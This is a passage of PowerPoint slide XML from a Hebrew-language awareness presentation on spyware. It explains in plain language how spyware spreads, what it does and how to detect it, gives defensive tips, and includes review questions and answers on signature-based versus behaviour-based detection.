              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מערכת:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה: תוכנות שמנטרות פעילות במערכת המחשב, כמו צילומי מסך, תנועות עכבר, ואפילו פעילויות רשת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה: רוגלה מסוג זה עשויה לשלוח צילומי מסך של מסמכים רגישים או מעקב אחר פעולות ברשת כדי לגלות סיסמאות או מידע רגיש אחר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37407988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28416A5-EE5E-428C-9390-0E382ABA391B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2295938" y="642594"/>
            <a:ext cx="8829261" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שיטות התפשטות נפוצות של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{62BF3E05-CF44-4B1C-A71A-36AB6F22E657}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1884459"/>
            <a:ext cx="10058400" cy="4416950"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Phishing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה: שליחת מיילים או הודעות שמתחזות לגורמים רשמיים כדי לשכנע את הקורבן ללחוץ על קישורים זדוניים או להוריד קבצים נגועים ברוגלה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה: מייל שנראה כאילו נשלח מהבנק שלך ומבקש ממך להיכנס לחשבון שלך כדי "לאמת פרטים". אם תלחץ על הקישור במייל ותזין את פרטי הכניסה שלך, האקר יקבל אותם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Exploits</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניצול חולשות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה: שימוש בפרצות אבטחה בתוכנות או במערכת ההפעלה כדי להתקין רוגלה ללא ידיעת המשתמש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה: פרצת אבטחה בדפדפן האינטרנט שלך עשויה לאפשר לאתר זדוני להתקין רוגלה על המחשב שלך מבלי שתבחין בכך.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Drive-by Downloads</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה: הורדה והתקנה אוטומטית של רוגלה כאשר המשתמש מבקר באתר אינטרנט זדוני. לא נדרשת פעולה יזומה מהמשתמש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה: ביקור באתר אינטרנט נגוע יכול להוביל להורדה אוטומטית של רוגלה למחשב שלך ללא אישורך או ידיעתך.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37644165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98D5E37-49DD-4890-AD5E-BBA3C9522CBA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6251712" y="642594"/>
            <a:ext cx="4873487" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>השפעות של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{66185EA6-81C0-4174-BC7E-3AD30D1A1BE8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. פגיעה בפרטיות: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> גונבות מידע אישי ופרטי מהמשתמש, כמו סיסמאות, פרטי בנק, היסטוריית גלישה ועוד. זה יכול להוביל לגניבת זהות או שימוש לרעה במידע.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. פגיעה בביצועי המחשב: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> רבות פועלות ברקע ויכולות להאט את המחשב באופן משמעותי, לגרום לתקלות או לקריסות, ולהקשות על המשתמש לתפקד בצורה תקינה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. נזק כלכלי: מעבר לגניבת כספים ישירה באמצעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, יש גם עלויות הקשורות לתיקון המערכת, שיחזור מידע, והתקנת תוכנות אבטחה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15284789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7EDF0F-AA1E-47F9-B553-3BCCF0CB9F1D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4224130" y="642594"/>
            <a:ext cx="6901070" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך לזהות אם יש לך רוגלה?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{53AF320E-6241-4E81-AA01-9601986F3AE2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ביצועים איטיים:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אם המחשב שלך פתאום איטי מהרגיל או קורס לעיתים קרובות, ייתכן שיש לך רוגלה שפועלת ברקע.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>פרסומות לא רצויות:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אם אתה רואה פרסומות קופצות באופן תדיר, אפילו כשאתה לא גולש באינטרנט, ייתכן שמדובר ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Adware </a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שינויים בדפדפן:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אם דף הבית שלך השתנה ללא ידיעתך.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40282090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94B718-3DE8-4994-9553-F307FF54F619}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2961860" y="642594"/>
            <a:ext cx="8163339" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה מעשית: איך רוגלה עובדת?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{40E119D1-CD3F-4890-8C00-B8384A52E10F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שהורדת משחק חינמי מאתר לא מוכר. במהלך ההתקנה, המשחק מבקש ממך הרשאות גישה למערכת (למשל, גישה לרשת ולמידע אישי). בפועל, המשחק מתקין גם רוגלה מסוג. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Keylogger </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מעתה, כל הקשה שאתה מבצע נשמרת ונשלחת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>להאקר</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לדוגמה, אם תקליד את פרטי הכניסה לחשבון הבנק שלך, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Keylogger</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ישמור את המידע הזה וישלח אותו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>להאקר</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שיכול להשתמש בו לגניבת כסף.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8027768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8003931-1B89-4342-985B-D4F4A149CA7C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3389242" y="642594"/>
            <a:ext cx="7735957" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כיצד ניתן להתגונן מפני </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DE6B9DCE-CF0B-45BA-9931-E448555EFB6D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקנת אנטי-וירוס ואנטי-רוגלה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תוכנות אבטחה יכולות לזהות ולהסיר </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מהמחשב.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שימוש בחומת אש</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:Firewall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> חומת אש יכולה למנוע גישה של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לרשת ולחסום ניסיונות זדוניים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>עדכונים שוטפים:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמור על מערכת ההפעלה והתוכנות מעודכנות כדי לסגור פערי אבטחה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>זהירות בהורדות:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הורד תוכנות רק מאתרים מוכרים ואמינים, והימנע מהורדת תוכנות פיראטיות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בדיקת הרשאות:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בזמן התקנת תוכנה, בדוק היטב אילו הרשאות היא מבקשת, והימנע מהתקנת תוכנות שדורשות גישה מוגזמת למערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30927177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11A7469-0CB3-467B-A79C-88BFB30D0B1F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9243390" y="642594"/>
            <a:ext cx="1881809"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2FE31CC5-F129-4E9A-B640-D6D18E338206}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מהם הסימנים העיקריים שמעידים על כך שמחשב עלול להיות נגוע ברוגלה?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. הסבר את ההבדל בין זיהוי מבוסס חתימות לזיהוי מבוסס התנהגות בהקשר של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>. מהם היתרונות והחסרונות של כל שיטה?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. אילו אמצעים ניתן לנקוט כדי להתגונן מפני </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> על גבי מכשירים ניידים?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. מדוע שימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Sandbox </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> להרצת תוכנות חשודות עשוי להיות יעיל בזיהוי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>? מהם המגבלות של שיטה זו?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25158783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07C9415-A253-43B1-B2C7-916D0B3EC904}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9044608" y="642594"/>
            <a:ext cx="2080591"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3E638D77-C9F0-4E3C-AA61-C29DE0C5596E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. סימנים שמעידים על נוכחות של רוגלה במחשב יכולים לכלול:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   א. האטה פתאומית של המחשב.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ב. הופעת חלונות פופ-אפ ותוכנות בלתי רצויות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ג. שינוי בהגדרות הדפדפן, כגון דף הבית או מנוע החיפוש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ד. פעולות חריגות ברשת, כמו שימוש יתר בחיבור לאינטרנט ללא הסבר ברור.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ה. הופעת תהליכים לא מוכרים ברקע.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24032819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20E7A43-FD37-490A-A625-DF638607CCD4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6957390" y="642594"/>
            <a:ext cx="4167809" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - תשובות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DF4203DF-54CA-44A3-A689-0492865F817F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>זיהוי מבוסס חתימות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מסתמך על מאגר נתונים של קודים ידועים של תוכנות זדוניות. כל קובץ שנמצא במערכת מושווה למאגר זה, ואם נמצאת התאמה, הקובץ מסומן כרוגלה. היתרון הוא דיוק בזיהוי של איומים ידועים, אך החיסרון הוא חוסר יכולת לזהות איומים חדשים שאינם במאגר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>זיהוי מבוסס התנהגות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בודק את אופן הפעולה של תהליכים במערכת כדי לזהות דפוסי התנהגות חריגים שמאפיינים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>. היתרון הוא היכולת לזהות איומים חדשים ולא מוכרים, אך החיסרון הוא האפשרות ליותר אזעקות שווא </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>false positives</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. כדי להתגונן מפני </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> במכשירים ניידים, מומלץ:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
